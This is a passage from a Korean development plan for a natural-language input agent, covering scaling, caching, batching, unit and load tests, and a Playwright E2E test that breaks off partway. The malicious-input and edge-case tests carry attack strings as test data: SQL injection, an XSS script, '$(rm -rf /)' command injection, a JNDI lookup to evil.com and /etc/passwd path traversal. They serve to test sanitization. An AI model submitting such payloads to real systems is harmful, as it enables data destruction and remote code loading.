        if not issubclass(adapter_class, ServiceAdapter):
            raise TypeError("Adapter must inherit from ServiceAdapter")

        self.adapters[service_name] = adapter_class

    async def process_with_fallback(
        self,
        primary_service: str,
        fallback_services: List[str],
        input_data: Any,
        **kwargs
    ) -> Any:
        """폴백 지원 처리"""

        services = [primary_service] + fallback_services

        for service in services:
            try:
                adapter = await self.get_adapter(service)
                async with adapter:
                    result = await adapter.process(input_data, **kwargs)
                    return result

            except Exception as e:
                logger.warning(
                    f"Service {service} failed: {str(e)}"
                )

                if service == services[-1]:
                    # 마지막 서비스도 실패
                    raise ServiceUnavailableError(
                        "All services failed"
                    )

                # 다음 서비스로 폴백
                continue

# NL Agent와 통합
class NLServiceIntegration:
    """NL Agent에 외부 서비스 통합"""

    def __init__(self, nl_agent: NLInputAgent):
        self.nl_agent = nl_agent
        self.adapter_manager = AdapterManager()
        self.cache = ServiceCache()

    async def enhance_with_external_services(
        self,
        input_text: str,
        services: List[str]
    ) -> Dict[str, Any]:
        """외부 서비스를 활용한 처리 향상"""

        enhancements = {}

        # 병렬 처리
        tasks = []
        for service in services:
            if service == 'translation':
                tasks.append(self._enhance_with_translation(input_text))
            elif service == 'advanced_nlp':
                tasks.append(self._enhance_with_nlp(input_text))
            elif service == 'domain_specific':
                tasks.append(self._enhance_with_domain(input_text))

        results = await asyncio.gather(*tasks, return_exceptions=True)

        for service, result in zip(services, results):
            if isinstance(result, Exception):
                logger.error(f"Service {service} failed: {result}")
                enhancements[service] = None
            else:
                enhancements[service] = result

        return enhancements

    async def _enhance_with_translation(
        self,
        text: str
    ) -> Optional[Dict[str, Any]]:
        """번역 서비스 활용"""

        # 캐시 확인
        cache_key = f"translation:{hashlib.md5(text.encode()).hexdigest()}"
        cached = await self.cache.get(cache_key)
        if cached:
            return cached

        # 번역 수행
        adapter = await self.adapter_manager.get_adapter('google_translate')
        async with adapter:
            result = await adapter.process(
                text,
                target_language='en'
            )

        # 캐시 저장
        await self.cache.set(cache_key, result, ttl=3600)

        return result
```

**검증 기준**:

- [ ] 다양한 외부 서비스 어댑터
- [ ] 재시도 및 폴백 메커니즘
- [ ] 비동기 병렬 처리
- [ ] 결과 캐싱

#### SubTask 4.8.4: 성능 최적화 및 스케일링

**담당자**: 성능 엔지니어  
**예상 소요시간**: 12시간

**작업 내용**:

```python
# backend/src/agents/implementations/nl_scaling_optimization.py
from typing import Dict, List, Any, Optional
import asyncio
from dataclasses import dataclass
import numpy as np

@dataclass
class ScalingMetrics:
    current_load: float
    response_time_p95: float
    queue_depth: int
    active_instances: int
    cpu_usage: float
    memory_usage: float

class NLAutoScaler:
    """NL Agent 자동 스케일링"""

    def __init__(self):
        self.min_instances = 2
        self.max_instances = 20
        self.target_cpu = 70
        self.target_response_time = 2.0  # 초
        self.scale_up_threshold = 0.8
        self.scale_down_threshold = 0.3
        self.metrics_collector = MetricsCollector()
        self.instance_manager = InstanceManager()

    async def monitor_and_scale(self):
        """지속적인 모니터링 및 스케일링"""

        while True:
            try:
                # 메트릭 수집
                metrics = await self.metrics_collector.collect()

                # 스케일링 결정
                scaling_decision = await self._make_scaling_decision(metrics)

                # 스케일링 실행
                if scaling_decision != 0:
                    await self._execute_scaling(scaling_decision, metrics)

                # 대기
                await asyncio.sleep(30)  # 30초 간격

            except Exception as e:
                logger.error(f"Auto-scaling error: {str(e)}")
                await asyncio.sleep(60)

    async def _make_scaling_decision(
        self,
        metrics: ScalingMetrics
    ) -> int:
        """스케일링 결정 (-1: 축소, 0: 유지, 1: 확장)"""

        # 다중 메트릭 기반 결정
        factors = []

        # CPU 사용률
        if metrics.cpu_usage > self.target_cpu * 1.2:
            factors.append(1)
        elif metrics.cpu_usage < self.target_cpu * 0.5:
            factors.append(-1)
        else:
            factors.append(0)

        # 응답 시간
        if metrics.response_time_p95 > self.target_response_time:
            factors.append(1)
        elif metrics.response_time_p95 < self.target_response_time * 0.5:
            factors.append(-1)
        else:
            factors.append(0)

        # 큐 깊이
        queue_per_instance = metrics.queue_depth / max(metrics.active_instances, 1)
        if queue_per_instance > 10:
            factors.append(1)
        elif queue_per_instance < 2:
            factors.append(-1)
        else:
            factors.append(0)

        # 가중 평균 결정
        decision_score = np.mean(factors)

        if decision_score > self.scale_up_threshold:
            return 1
        elif decision_score < -self.scale_down_threshold:
            return -1
        else:
            return 0

    async def _execute_scaling(
        self,
        direction: int,
        metrics: ScalingMetrics
    ):
        """스케일링 실행"""

        current_instances = metrics.active_instances

        if direction == 1:  # Scale up
            new_instances = min(
                current_instances + self._calculate_scale_step(metrics),
                self.max_instances
            )
        else:  # Scale down
            new_instances = max(
                current_instances - 1,
                self.min_instances
            )

        if new_instances != current_instances:
            await self.instance_manager.scale_to(new_instances)

            logger.info(
                f"Scaled from {current_instances} to {new_instances} instances"
            )

            # 스케일링 이벤트 기록
            await self._record_scaling_event(
                current_instances,
                new_instances,
                metrics
            )

    def _calculate_scale_step(self, metrics: ScalingMetrics) -> int:
        """스케일 업 단계 계산"""

        # 부하에 따른 동적 스케일링
        if metrics.response_time_p95 > self.target_response_time * 2:
            return 3  # 급격한 확장
        elif metrics.queue_depth > 100:
            return 2
        else:
            return 1

class NLLoadBalancer:
    """NL Agent 로드 밸런싱"""

    def __init__(self):
        self.instances: List[AgentInstance] = []
        self.health_checker = HealthChecker()
        self.routing_strategy = "least_connections"  # or "round_robin", "weighted"

    async def route_request(
        self,
        request: NLRequest
    ) -> AgentInstance:
        """요청을 적절한 인스턴스로 라우팅"""

        # 건강한 인스턴스만 선택
        healthy_instances = await self._get_healthy_instances()

        if not healthy_instances:
            raise NoHealthyInstanceError("No healthy instances available")

        # 라우팅 전략에 따라 선택
        if self.routing_strategy == "least_connections":
            instance = min(healthy_instances, key=lambda i: i.active_connections)
        elif self.routing_strategy == "round_robin":
            instance = self._round_robin_select(healthy_instances)
        elif self.routing_strategy == "weighted":
            instance = self._weighted_select(healthy_instances)
        else:
            instance = healthy_instances[0]

        # 연결 수 증가
        instance.active_connections += 1

        return instance

    async def _get_healthy_instances(self) -> List[AgentInstance]:
        """건강한 인스턴스 목록 반환"""

        healthy = []

        for instance in self.instances:
            if await self.health_checker.is_healthy(instance):
                healthy.append(instance)

        return healthy

class NLCacheOptimizer:
    """NL 처리 캐시 최적화"""

    def __init__(self):
        self.cache_layers = {
            'l1': MemoryCache(max_size=1000),      # 메모리 캐시
            'l2': RedisCache(ttl=3600),            # Redis 캐시
            'l3': S3Cache(ttl=86400)               # S3 장기 캐시
        }
        self.cache_stats = CacheStatistics()

    async def get_or_compute(
        self,
        key: str,
        compute_func: callable,
        ttl: Optional[int] = None
    ) -> Any:
        """캐시에서 가져오거나 계산"""

        # L1 캐시 확인
        value = await self.cache_layers['l1'].get(key)
        if value is not None:
            self.cache_stats.record_hit('l1')
            return value

        # L2 캐시 확인
        value = await self.cache_layers['l2'].get(key)
        if value is not None:
            self.cache_stats.record_hit('l2')
            # L1 캐시에 승격
            await self.cache_layers['l1'].set(key, value)
            return value

        # L3 캐시 확인
        value = await self.cache_layers['l3'].get(key)
        if value is not None:
            self.cache_stats.record_hit('l3')
            # L1, L2 캐시에 승격
            await self.cache_layers['l1'].set(key, value)
            await self.cache_layers['l2'].set(key, value, ttl=3600)
            return value

        # 캐시 미스 - 계산 수행
        self.cache_stats.record_miss()

        value = await compute_func()

        # 모든 레이어에 저장
        await self._cache_to_all_layers(key, value, ttl)

        return value

    async def _cache_to_all_layers(
        self,
        key: str,
        value: Any,
        ttl: Optional[int]
    ):
        """모든 캐시 레이어에 저장"""

        tasks = [
            self.cache_layers['l1'].set(key, value),
            self.cache_layers['l2'].set(key, value, ttl=ttl or 3600),
            self.cache_layers['l3'].set(key, value, ttl=ttl or 86400)
        ]

        await asyncio.gather(*tasks, return_exceptions=True)

    async def preload_cache(self, patterns: List[str]):
        """캐시 예열"""

        # 자주 사용되는 패턴 미리 로드
        for pattern in patterns:
            key = self._generate_cache_key(pattern)

            # L3에서 L1, L2로 승격
            value = await self.cache_layers['l3'].get(key)
            if value:
                await self.cache_layers['l1'].set(key, value)
                await self.cache_layers['l2'].set(key, value)

class NLBatchProcessor:
    """배치 처리 최적화"""

    def __init__(self, batch_size: int = 10, wait_time: float = 0.1):
        self.batch_size = batch_size
        self.wait_time = wait_time
        self.pending_requests: List[Tuple[str, asyncio.Future]] = []
        self.processing = False

    async def process(self, input_text: str) -> Any:
        """배치 처리를 위한 요청 추가"""

        future = asyncio.Future()
        self.pending_requests.append((input_text, future))

        # 배치 처리 시작
        if not self.processing and len(self.pending_requests) >= self.batch_size:
            asyncio.create_task(self._process_batch())
        elif not self.processing:
            # 대기 후 처리
            asyncio.create_task(self._delayed_process())

        return await future

    async def _process_batch(self):
        """배치 처리 실행"""

        self.processing = True

        # 현재 배치 추출
        batch = self.pending_requests[:self.batch_size]
        self.pending_requests = self.pending_requests[self.batch_size:]

        try:
            # 배치 처리
            inputs = [text for text, _ in batch]
            results = await self._batch_inference(inputs)

            # 결과 반환
            for (_, future), result in zip(batch, results):
                future.set_result(result)

        except Exception as e:
            # 에러 전파
            for _, future in batch:
                future.set_exception(e)

        finally:
            self.processing = False

            # 남은 요청이 있으면 계속 처리
            if self.pending_requests:
                asyncio.create_task(self._process_batch())

    async def _delayed_process(self):
        """지연 배치 처리"""

        await asyncio.sleep(self.wait_time)

        if not self.processing and self.pending_requests:
            await self._process_batch()
```

**검증 기준**:

- [ ] 자동 스케일링 구현
- [ ] 지능형 로드 밸런싱
- [ ] 다계층 캐싱 전략
- [ ] 배치 처리 최적화

---

# Phase 4: 9개 핵심 에이전트 구현 - Part 5 (Tasks 4.9-4.10)

## 1. NL Input Agent (자연어 입력 에이전트) - 계속

### Task 4.9: NL Agent 테스트 및 품질 보증

#### SubTask 4.9.1: 단위 및 통합 테스트 프레임워크

**담당자**: QA 엔지니어  
**예상 소요시간**: 12시간

**작업 내용**:

```python
# backend/tests/agents/nl_input/test_framework.py
import pytest
import asyncio
from typing import Dict, List, Any, Optional
from unittest.mock import Mock, AsyncMock, patch
import json

class NLTestFramework:
    """NL Agent 테스트 프레임워크"""

    def __init__(self):
        self.test_data_loader = TestDataLoader()
        self.mock_factory = MockFactory()
        self.assertion_helper = AssertionHelper()
        self.performance_tracker = PerformanceTracker()

@pytest.fixture
def nl_agent_test_fixture():
    """NL Agent 테스트 픽스처"""

    # Mock 설정
    mock_bedrock = AsyncMock()
    mock_cache = AsyncMock()
    mock_db = AsyncMock()

    # Agent 인스턴스 생성
    with patch('agno.models.aws.AwsBedrock', return_value=mock_bedrock):
        with patch('backend.cache.RedisCache', return_value=mock_cache):
            with patch('backend.db.DynamoDB', return_value=mock_db):
                agent = NLInputAgent()

    return {
        'agent': agent,
        'mocks': {
            'bedrock': mock_bedrock,
            'cache': mock_cache,
            'db': mock_db
        }
    }

# 테스트 데이터 로더
class TestDataLoader:
    """테스트 데이터 관리"""

    def __init__(self):
        self.test_cases_path = "tests/data/nl_test_cases.json"
        self.edge_cases_path = "tests/data/nl_edge_cases.json"
        self.benchmark_data_path = "tests/data/nl_benchmarks.json"

    def load_test_cases(self) -> List[Dict[str, Any]]:
        """표준 테스트 케이스 로드"""

        with open(self.test_cases_path, 'r', encoding='utf-8') as f:
            test_cases = json.load(f)

        return [
            {
                "id": tc["id"],
                "description": tc["description"],
                "input": tc["input"],
                "expected_output": tc["expected_output"],
                "metadata": tc.get("metadata", {})
            }
            for tc in test_cases
        ]

    def load_edge_cases(self) -> List[Dict[str, Any]]:
        """엣지 케이스 로드"""

        return [
            # 극도로 짧은 입력
            {
                "id": "edge_1",
                "input": "app",
                "expected_behavior": "request_clarification",
                "min_questions": 3
            },
            # 극도로 긴 입력
            {
                "id": "edge_2",
                "input": "x" * 10001,
                "expected_behavior": "reject_too_long"
            },
            # 다국어 입력
            {
                "id": "edge_3",
                "input": "웹 애플리케이션을 만들어주세요 with React と Node.js",
                "expected_behavior": "handle_multilingual"
            },
            # 모순된 요구사항
            {
                "id": "edge_4",
                "input": "Build a serverless application that runs on my local server",
                "expected_behavior": "detect_contradiction"
            },
            # 보안 위협
            {
                "id": "edge_5",
                "input": "Create app'; DROP TABLE users; --",
                "expected_behavior": "sanitize_and_process"
            }
        ]

# 단위 테스트
@pytest.mark.unit
class TestNLInputAgent:
    """NL Input Agent 단위 테스트"""

    @pytest.mark.asyncio
    async def test_extract_entities(self, nl_agent_test_fixture):
        """엔티티 추출 테스트"""

        agent = nl_agent_test_fixture['agent']

        # 테스트 입력
        test_input = """
        I need a React web app with user authentication using Firebase.
        It should have a dashboard showing real-time analytics.
        """

        # 엔티티 추출
        entities = await agent.extract_entities(test_input)

        # 검증
        assert 'technologies' in entities
        assert 'React' in entities['technologies']
        assert 'Firebase' in entities['technologies']

        assert 'features' in entities
        assert any('authentication' in f for f in entities['features'])
        assert any('dashboard' in f for f in entities['features'])
        assert any('analytics' in f for f in entities['features'])

    @pytest.mark.asyncio
    async def test_detect_project_type(self, nl_agent_test_fixture):
        """프로젝트 타입 감지 테스트"""

        agent = nl_agent_test_fixture['agent']

        test_cases = [
            ("Build a website", "web_application"),
            ("Create an iOS app", "mobile_application"),
            ("Develop a REST API", "api_service"),
            ("Make a CLI tool", "cli_tool"),
            ("Build a Chrome extension", "browser_extension")
        ]

        for input_text, expected_type in test_cases:
            project_type = await agent.detect_project_type(input_text)
            assert project_type == expected_type, \
                f"Failed for '{input_text}': expected {expected_type}, got {project_type}"

    @pytest.mark.asyncio
    async def test_generate_clarification_questions(self, nl_agent_test_fixture):
        """명확화 질문 생성 테스트"""

        agent = nl_agent_test_fixture['agent']

        # 모호한 입력
        vague_input = "I want to build something cool"

        # 명확화 질문 생성
        questions = await agent.generate_clarification_questions(vague_input)

        # 검증
        assert len(questions) > 0
        assert all(isinstance(q, dict) for q in questions)
        assert all('question' in q for q in questions)
        assert all('category' in q for q in questions)
        assert all('options' in q or 'type' in q for q in questions)

    @pytest.mark.parametrize("language,expected_lang_code", [
        ("Build a web app", "en"),
        ("Construire une application web", "fr"),
        ("웹 애플리케이션을 만들어주세요", "ko"),
        ("Webアプリを作ってください", "ja"),
    ])
    @pytest.mark.asyncio
    async def test_language_detection(
        self,
        nl_agent_test_fixture,
        language,
        expected_lang_code
    ):
        """언어 감지 테스트"""

        agent = nl_agent_test_fixture['agent']
        detected_lang = await agent.detect_language(language)
        assert detected_lang == expected_lang_code

# 통합 테스트
@pytest.mark.integration
class TestNLIntegration:
    """NL Agent 통합 테스트"""

    @pytest.mark.asyncio
    async def test_full_processing_pipeline(self, nl_agent_test_fixture):
        """전체 처리 파이프라인 테스트"""

        agent = nl_agent_test_fixture['agent']
        mocks = nl_agent_test_fixture['mocks']

        # Mock 응답 설정
        mocks['bedrock'].arun.return_value = json.dumps({
            "project_type": "web_application",
            "features": ["user_auth", "dashboard"],
            "technologies": ["React", "Node.js"],
            "requirements": {
                "functional": ["User can login", "User can view dashboard"],
                "non_functional": ["Response time < 2s", "Support 1000 users"]
            }
        })

        # 입력 처리
        input_text = "Build a web app with user authentication and dashboard"
        result = await agent.process_description(input_text)

        # 검증
        assert result is not None
        assert result.project_type == "web_application"
        assert len(result.technical_requirements) > 0
        assert len(result.non_functional_requirements) > 0

        # Mock 호출 검증
        mocks['bedrock'].arun.assert_called()

    @pytest.mark.asyncio
    async def test_clarification_flow(self, nl_agent_test_fixture):
        """명확화 플로우 통합 테스트"""

        agent = nl_agent_test_fixture['agent']

        # 1단계: 초기 분석
        vague_input = "I need an app"
        initial_result = await agent.process_description(vague_input)

        assert initial_result.needs_clarification
        assert len(initial_result.clarification_questions) > 0

        # 2단계: 명확화 응답
        clarifications = {
            q.id: "web application" if "type" in q.question else "e-commerce"
            for q in initial_result.clarification_questions
        }

        # 3단계: 업데이트된 분석
        final_result = await agent.process_clarifications(
            initial_result,
            clarifications
        )

        assert not final_result.needs_clarification
        assert final_result.project_type is not None
        assert final_result.confidence > initial_result.confidence

# 성능 테스트
@pytest.mark.performance
class TestNLPerformance:
    """NL Agent 성능 테스트"""

    @pytest.mark.asyncio
    async def test_response_time(self, nl_agent_test_fixture):
        """응답 시간 테스트"""

        agent = nl_agent_test_fixture['agent']
        performance_tracker = PerformanceTracker()

        # 다양한 입력 크기로 테스트
        test_inputs = [
            "Simple web app",  # 짧은 입력
            "I need a complex e-commerce platform with user authentication, " * 10,  # 중간
            "Build an enterprise application with microservices... " * 50  # 긴 입력
        ]

        for input_text in test_inputs:
            start_time = asyncio.get_event_loop().time()

            await agent.process_description(input_text)

            elapsed_time = asyncio.get_event_loop().time() - start_time
            performance_tracker.record("response_time", elapsed_time)

            # 응답 시간 검증 (SLA: 2초)
            assert elapsed_time < 2.0, f"Response time {elapsed_time}s exceeds SLA"

        # 평균 응답 시간
        avg_response_time = performance_tracker.get_average("response_time")
        assert avg_response_time < 1.0, f"Average response time {avg_response_time}s too high"

    @pytest.mark.asyncio
    async def test_concurrent_processing(self, nl_agent_test_fixture):
        """동시 처리 성능 테스트"""

        agent = nl_agent_test_fixture['agent']

        # 100개의 동시 요청
        concurrent_requests = 100
        inputs = [f"Build web app number {i}" for i in range(concurrent_requests)]

        start_time = asyncio.get_event_loop().time()

        # 동시 실행
        tasks = [agent.process_description(inp) for inp in inputs]
        results = await asyncio.gather(*tasks, return_exceptions=True)

        elapsed_time = asyncio.get_event_loop().time() - start_time

        # 검증
        successful = sum(1 for r in results if not isinstance(r, Exception))
        assert successful >= concurrent_requests * 0.95  # 95% 성공률

        # 처리량 계산
        throughput = concurrent_requests / elapsed_time
        assert throughput > 10, f"Throughput {throughput} req/s is too low"

# 엣지 케이스 테스트
@pytest.mark.edge_cases
class TestNLEdgeCases:
    """NL Agent 엣지 케이스 테스트"""

    @pytest.mark.asyncio
    async def test_malicious_input_handling(self, nl_agent_test_fixture):
        """악의적 입력 처리 테스트"""

        agent = nl_agent_test_fixture['agent']

        malicious_inputs = [
            "'; DROP TABLE users; --",
            "<script>alert('xss')</script>",
            "Build app $(rm -rf /)",
            "Create ${jndi:ldap://evil.com/a}",
            "Make app with ../../../../etc/passwd"
        ]

        for malicious_input in malicious_inputs:
            # 예외가 발생하지 않아야 함
            result = await agent.process_description(malicious_input)

            # 살균된 입력 확인
            assert result is not None
            assert not any(
                dangerous in str(result)
                for dangerous in ['DROP', 'script', 'rm -rf', 'jndi:', '../']
            )
```

**검증 기준**:

- [ ] 포괄적인 단위 테스트
- [ ] 통합 테스트 시나리오
- [ ] 성능 벤치마크 테스트
- [ ] 엣지 케이스 처리

#### SubTask 4.9.2: 부하 테스트 및 스트레스 테스트

**담당자**: 성능 테스트 엔지니어  
**예상 소요시간**: 10시간

**작업 내용**:

```python
# backend/tests/load/nl_load_test.py
from locust import HttpUser, task, between, events
from locust.contrib.fasthttp import FastHttpUser
import json
import random
from datetime import datetime

class NLLoadTestUser(FastHttpUser):
    """NL Agent 부하 테스트 사용자"""

    wait_time = between(1, 3)

    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self.test_data = self._load_test_data()
        self.session_id = None
        self.clarification_needed = False

    def _load_test_data(self):
        """테스트 데이터 로드"""

        return {
            "simple_descriptions": [
                "Build a todo app with React",
                "Create a blog platform",
                "Make an e-commerce website",
                "Develop a chat application",
                "Build a project management tool"
            ],
            "complex_descriptions": [
                """
                I need a comprehensive e-commerce platform with the following features:
                - Multi-vendor marketplace support
                - Real-time inventory management
                - AI-powered product recommendations
                - Mobile apps for iOS and Android
                - Integration with multiple payment gateways
                - Advanced analytics dashboard
                - Multi-language and multi-currency support
                """,
                """
                Build a scalable social media platform that can handle millions of users.
                Requirements include real-time messaging, video streaming, content moderation,
                personalized feeds using machine learning, and comprehensive admin tools.
                Must be GDPR compliant and support horizontal scaling.
                """
            ],
            "languages": ["en", "es", "fr", "de", "ja", "ko"],
            "clarification_responses": {
                "project_type": ["web", "mobile", "desktop", "api"],
                "target_users": ["consumers", "businesses", "internal"],
                "scale": ["small", "medium", "large", "enterprise"]
            }
        }

    def on_start(self):
        """테스트 시작 시 인증"""

        response = self.client.post(
            "/api/v1/auth/login",
            json={
                "username": f"loadtest_user_{random.randint(1, 1000)}",
                "password": "test_password"
            }
        )

        if response.status_code == 200:
            self.token = response.json()["token"]
            self.client.headers["Authorization"] = f"Bearer {self.token}"

    @task(3)
    def simple_analysis(self):
        """간단한 분석 요청"""

        description = random.choice(self.test_data["simple_descriptions"])

        with self.client.post(
            "/api/v1/nl-input/analyze",
            json={
                "description": description,
                "user_id": f"load_test_{self.user_id}",
                "language": random.choice(self.test_data["languages"])
            },
            catch_response=True
        ) as response:
            if response.status_code == 200:
                data = response.json()

                # 응답 검증
                if "requirements" in data and "project_id" in data:
                    response.success()

                    # 명확화 필요 여부 저장
                    if data.get("clarification_needed"):
                        self.session_id = data.get("session_id")
                        self.clarification_needed = True
                else:
                    response.failure("Invalid response structure")
            else:
                response.failure(f"Status code: {response.status_code}")

    @task(1)
    def complex_analysis(self):
        """복잡한 분석 요청"""

        description = random.choice(self.test_data["complex_descriptions"])

        with self.client.post(
            "/api/v1/nl-input/analyze",
            json={
                "description": description,
                "user_id": f"load_test_{self.user_id}",
                "context": {
                    "industry": random.choice(["tech", "finance", "healthcare"]),
                    "budget": random.choice(["low", "medium", "high"])
                }
            },
            catch_response=True,
            name="/api/v1/nl-input/analyze [complex]"
        ) as response:
            if response.status_code == 200:
                response.success()
            else:
                response.failure(f"Complex analysis failed: {response.status_code}")

    @task(2)
    def clarification_flow(self):
        """명확화 플로우 테스트"""

        if not self.clarification_needed or not self.session_id:
            # 먼저 명확화가 필요한 요청 생성
            self._trigger_clarification_need()
            return

        # 명확화 응답 전송
        answers = {}
        for i in range(random.randint(1, 5)):
            question_id = f"q_{i}"
            answer_type = random.choice(list(self.test_data["clarification_responses"].keys()))
            answers[question_id] = random.choice(
                self.test_data["clarification_responses"][answer_type]
            )

        with self.client.post(
            f"/api/v1/nl-input/clarify/{self.session_id}",
            json={"answers": answers},
            catch_response=True,
            name="/api/v1/nl-input/clarify"
        ) as response:
            if response.status_code == 200:
                response.success()
                self.clarification_needed = False
                self.session_id = None
            else:
                response.failure(f"Clarification failed: {response.status_code}")

    def _trigger_clarification_need(self):
        """명확화가 필요한 요청 생성"""

        vague_descriptions = [
            "I need an app",
            "Build something cool",
            "Make a website",
            "Create a system"
        ]

        self.client.post(
            "/api/v1/nl-input/analyze",
            json={
                "description": random.choice(vague_descriptions),
                "user_id": f"load_test_{self.user_id}"
            }
        )

# 스트레스 테스트 시나리오
class NLStressTestUser(FastHttpUser):
    """극한 부하 테스트"""

    wait_time = between(0.1, 0.5)  # 매우 짧은 대기 시간

    @task
    def stress_test(self):
        """스트레스 테스트 시나리오"""

        # 극한 조건 생성
        stress_scenarios = [
            # 매우 긴 입력
            {
                "description": "Build " + " ".join([
                    f"feature_{i}" for i in range(1000)
                ]),
                "name": "extreme_length"
            },
            # 많은 특수 문자
            {
                "description": "Create app " + "!@#$%^&*()" * 100,
                "name": "special_chars"
            },
            # 유니코드 스트레스
            {
                "description": "开发一个应用 " + "🚀" * 500 + " עם תכונות",
                "name": "unicode_stress"
            },
            # 중첩된 구조
            {
                "description": json.dumps({
                    "nested": {"level": {"deep": {"data": "x" * 1000}}}
                }),
                "name": "nested_json"
            }
        ]

        scenario = random.choice(stress_scenarios)

        with self.client.post(
            "/api/v1/nl-input/analyze",
            json={
                "description": scenario["description"],
                "user_id": f"stress_test_{self.user_id}"
            },
            catch_response=True,
            name=f"/api/v1/nl-input/analyze [{scenario['name']}]"
        ) as response:
            # 스트레스 조건에서도 안정적으로 응답해야 함
            if response.status_code in [200, 400, 413]:  # 정상, 잘못된 요청, 너무 큼
                response.success()
            else:
                response.failure(f"Unexpected status: {response.status_code}")

# 성능 메트릭 수집
@events.request.add_listener
def on_request(request_type, name, response_time, response_length, response, **kwargs):
    """요청 메트릭 수집"""

    # 커스텀 메트릭 기록
    if response_time > 2000:  # 2초 초과
        print(f"[SLOW] {name}: {response_time}ms")

    # 에러 상세 정보
    if response and response.status_code >= 400:
        print(f"[ERROR] {name}: {response.status_code} - {response.text[:200]}")

@events.test_stop.add_listener
def on_test_stop(environment, **kwargs):
    """테스트 종료 시 보고서 생성"""

    print("\n=== Load Test Summary ===")
    print(f"Total Requests: {environment.stats.total.num_requests}")
    print(f"Failed Requests: {environment.stats.total.num_failures}")
    print(f"Median Response Time: {environment.stats.total.median_response_time}ms")
    print(f"95th Percentile: {environment.stats.total.get_response_time_percentile(0.95)}ms")
    print(f"99th Percentile: {environment.stats.total.get_response_time_percentile(0.99)}ms")

    # 상세 보고서 저장
    report = {
        "timestamp": datetime.now().isoformat(),
        "total_requests": environment.stats.total.num_requests,
        "failures": environment.stats.total.num_failures,
        "response_times": {
            "median": environment.stats.total.median_response_time,
            "p95": environment.stats.total.get_response_time_percentile(0.95),
            "p99": environment.stats.total.get_response_time_percentile(0.99)
        },
        "rps": environment.stats.total.current_rps
    }

    with open("load_test_report.json", "w") as f:
        json.dump(report, f, indent=2)
```

```yaml
# backend/tests/load/stress-test-config.yaml
# K6 스트레스 테스트 설정
scenarios:
  # 점진적 부하 증가
  ramp_up:
    executor: 'ramping-vus'
    startVUs: 0
    stages:
      - duration: '2m', target: 100
      - duration: '5m', target: 100
      - duration: '2m', target: 200
      - duration: '5m', target: 200
      - duration: '2m', target: 0
    gracefulRampDown: '30s'

  # 스파이크 테스트
  spike_test:
    executor: 'ramping-vus'
    startVUs: 0
    stages:
      - duration: '30s', target: 10
      - duration: '30s', target: 500  # 급격한 증가
      - duration: '2m', target: 500
      - duration: '30s', target: 10   # 급격한 감소

  # 지속 부하 테스트
  sustained_load:
    executor: 'constant-vus'
    vus: 200
    duration: '30m'

  # 극한 스트레스 테스트
  stress_test:
    executor: 'ramping-arrival-rate'
    startRate: 0
    timeUnit: '1s'
    preAllocatedVUs: 500
    stages:
      - duration: '5m', target: 1000  # 초당 1000 요청까지 증가
      - duration: '10m', target: 1000
      - duration: '5m', target: 0

thresholds:
  http_req_duration: ['p(95)<2000', 'p(99)<5000']  # 95%는 2초, 99%는 5초 이내
  http_req_failed: ['rate<0.1']  # 실패율 10% 미만
  http_reqs: ['rate>100']  # 초당 100개 이상 처리
```

**검증 기준**:

- [ ] Locust 부하 테스트 구현
- [ ] K6 스트레스 테스트 설정
- [ ] 다양한 부하 시나리오
- [ ] 성능 메트릭 수집 및 보고

#### SubTask 4.9.3: E2E 테스트 자동화

**담당자**: 테스트 자동화 엔지니어  
**예상 소요시간**: 12시간

**작업 내용**:

```typescript
// backend/tests/e2e/nl-agent-e2e.spec.ts
import { test, expect } from "@playwright/test";
import { NLTestHelper } from "./helpers/nl-test-helper";

// E2E 테스트 헬퍼
class NLAgentE2EHelper {
  constructor(private page: Page) {}

  async login(username: string, password: string) {
    await this.page.goto("/login");
    await this.page.fill('[data-testid="username"]', username);
    await this.page.fill('[data-testid="password"]', password);
    await this.page.click('[data-testid="login-button"]');
    await this.page.waitForURL("/dashboard");
  }

  async submitProjectDescription(description: string) {
    await this.page.goto("/new-project");
    await this.page.fill('[data-testid="project-description"]', description);
    await this.page.click('[data-testid="analyze-button"]');
  }

  async waitForAnalysis() {
    await this.page.waitForSelector('[data-testid="analysis-complete"]', {
      timeout: 30000,
    });
  }

  async answerClarificationQuestions(answers: Record<string, string>) {
    for (const [questionId, answer] of Object.entries(answers)) {
      const selector = `[data-testid="clarification-${questionId}"]`;
      await this.page.fill(selector, answer);
    }
    await this.page.click('[data-testid="submit-clarifications"]');
  }
}

test.describe("NL Agent E2E Tests", () => {
  let helper: NLAgentE2EHelper;

  test.beforeEach(async ({ page }) => {
    helper = new NLAgentE2EHelper(page);
    await helper.login("test_user", "test_password");
  });

  test("완전한 프로젝트 생성 플로우", async ({ page }) => {
    // 1. 프로젝트 설명 입력
    await helper.submitProjectDescription(`
      I need a task management web application with the following features:
      - User authentication with email and social login
      - Create, update, and delete tasks
      - Assign tasks to team members
      - Due date reminders
      - Dashboard with task statistics
      Built with React and Node.js, deployed on AWS
    `);

    // 2. 분석 완료 대기
    await helper.waitForAnalysis();

    // 3. 결과 확인
    const projectType = await page.textContent('[data-testid="project-type"]');
    expect(projectType).toBe("Web Application");

    const technologies = await page.$$eval(
      '[data-testid="technology-item"]',
      (elements) => elements.map((el) => el.textContent)
    );
    expect(technologies).toContain("React");
    expect(technologies).toContain("Node.js");
    expect(technologies).toContain("AWS");

    // 4. 요구사항 확인
    const requirements = await page.$$eval(
      '[data-testid="requirement-item"]',
      (elements) => elements.map((el) => el.textContent)
    );
    expect(requirements.length).toBeGreaterThan(5);
    expect(requirements.some((r) => r.includes("authentication"))).toBe(true);
    expect(requirements.some((r) => r.includes("task management"))).toBe(true);

    // 5. 프로젝트 생성 진행
    await page.click('[data-testid="create-project-button"]');
    await page.waitForURL(/\/project\/[a-zA-Z0-9-]+/);

    // 6. 생성된 프로젝트 확인
    const projectTitle = await page.textContent(
      '[data-testid="project-title"]'
    );
    expect(projectTitle).toContain("Task Management Application");
  });

  test("명확화 플로우 E2E", async ({ page }) => {
    // 1. 모호한 설명 입력
    await helper.submitProjectDescription("I want to build an app");

    // 2. 명확화 질문 표시 확인
    await page.waitForSelector('[data-testid="clarification-form"]');

    const questions = await page.$$('[data-testid^="clarification-question-"]');
    expect(questions.length).toBeGreaterThan(0);

    // 3. 질문 내용 확인
    const firstQuestion = await questions[0].textContent();
    expect(firstQuestion).toContain("What type of application");

    // 4. 답변 제공
    await helper.answerClarificationQuestions({
      type: "Web Application",
      purpose: "E-commerce",
      users: "B2C customers",
      scale: "Medium (1000-10000 users)",
    });

    // 5. 업데이트된 분석 확인
    await helper.waitForAnalysis();

